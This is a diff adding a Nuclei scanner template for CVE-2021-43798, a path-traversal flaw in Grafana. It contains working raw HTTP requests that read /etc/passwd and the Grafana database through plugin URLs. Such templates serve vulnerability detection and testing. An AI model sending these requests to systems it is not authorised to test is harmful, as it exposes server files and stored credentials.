@@ -1,0 +1,44 @@
+id: grafana-welcome-arbitrary-file-read
+info:
+  name: Grafana Welcome Arbitrary File Reading
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Grafana is a cross-platform, open source platform for data visualization web applications. Unauthorized attackers can exploit this vulnerability to gain access to sensitive server files.
+  tags: file-read
+  reference:
+    - https://blog.csdn.net/qq_36197704/article/details/123480175
+  classification:
+    cve-id: CVE-2021-43798
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        GET /public/plugins/welcome/../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x:0:0:root:"
+        part: body
+
+  - raw:
+      - |
+        GET /public/plugins/gettingstarted/../../../../../../../../../../../../../../../var/lib/grafana/grafana.db HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "data"
+        part: body
